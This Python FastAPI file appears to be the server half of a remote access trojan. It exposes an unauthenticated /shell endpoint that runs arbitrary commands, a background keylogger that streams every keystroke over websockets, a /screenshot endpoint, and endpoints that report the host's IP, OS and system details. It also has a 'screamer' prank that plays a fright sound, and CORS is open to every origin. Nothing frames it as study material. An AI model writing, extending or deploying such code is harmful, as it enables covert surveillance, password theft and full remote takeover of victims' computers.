from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from utils import get_user_os, get_ip, get_os_spec
import subprocess
import threading
from pynput import keyboard
import asyncio
from pydub import AudioSegment
from pydub.playback import play
from PIL import Image, ImageTk
import tkinter as tk
import os
import pyautogui
from fastapi.responses import FileResponse

# --- Asset paths ---
ASSETS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets")
SOUND_PATH = os.path.join(ASSETS_DIR, "screamer.mp3")
IMAGE_PATH = os.path.join(ASSETS_DIR, "screamer.jpg")

# --- Utility/helper functions ---

def show_fullscreen_image(image_path):
    def _show():
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(background='black')
        img = Image.open(image_path)
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        img = img.resize((screen_width, screen_height), Image.ANTIALIAS)
        tk_img = ImageTk.PhotoImage(img)
        label = tk.Label(root, image=tk_img, bg='black')
        label.pack(expand=True)
        root.after(5000, root.destroy)  # Show for 5 seconds
        root.mainloop()
    threading.Thread(target=_show, daemon=True).start()

def display_screamer():
    song = AudioSegment.from_mp3(SOUND_PATH)
    play(song)

connected_websockets = set()
ws_lock = threading.Lock()
main_loop = None

async def send_key_to_all(key_str):
    with ws_lock:
        websockets = list(connected_websockets)
    for ws in websockets:
        try:
            await ws.send_text(f"Key pressed: {key_str}")
        except Exception:
            pass

def on_press(key):
    key_str = str(key)
    global main_loop
    if main_loop and main_loop.is_running():
        asyncio.run_coroutine_threadsafe(send_key_to_all(key_str), main_loop)

def start_keyboard_listener():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# --- FastAPI app and routes ---

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("startup")
def startup_event():
    global main_loop
    main_loop = asyncio.get_running_loop()
    threading.Thread(target=start_keyboard_listener, daemon=True).start()

@app.get('/status')
def status_check():
    return {"status": "online"}

@app.get("/os")
def read_os():
    return {"os": get_user_os()}

@app.get("/ip")
def read_ip():
    return {"ip": get_ip()}

@app.post("/shell")
async def run_shell(request: Request):
    data = await request.json()
    command = data.get("command")
    if not command:
        return {"error": "No command provided."}
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except Exception as e:
        return {"error": str(e)}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    with ws_lock:
        connected_websockets.add(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            await websocket.send_text(f"Echo: {data}")
    except WebSocketDisconnect:
        with ws_lock:
            connected_websockets.discard(websocket)

@app.get('/system-info')
def get_system():
    return {"spec": get_os_spec()}

@app.get('/screamer')
def trigger_screamer():
    display_screamer()
    return {"status": "screamer triggered"}

@app.get('/screenshot')
def screenshot():
    screenshot_path = os.path.join(ASSETS_DIR, 'screenshot.png')
    image = pyautogui.screenshot()
    image.save(screenshot_path)
    return FileResponse(screenshot_path, media_type='image/png')
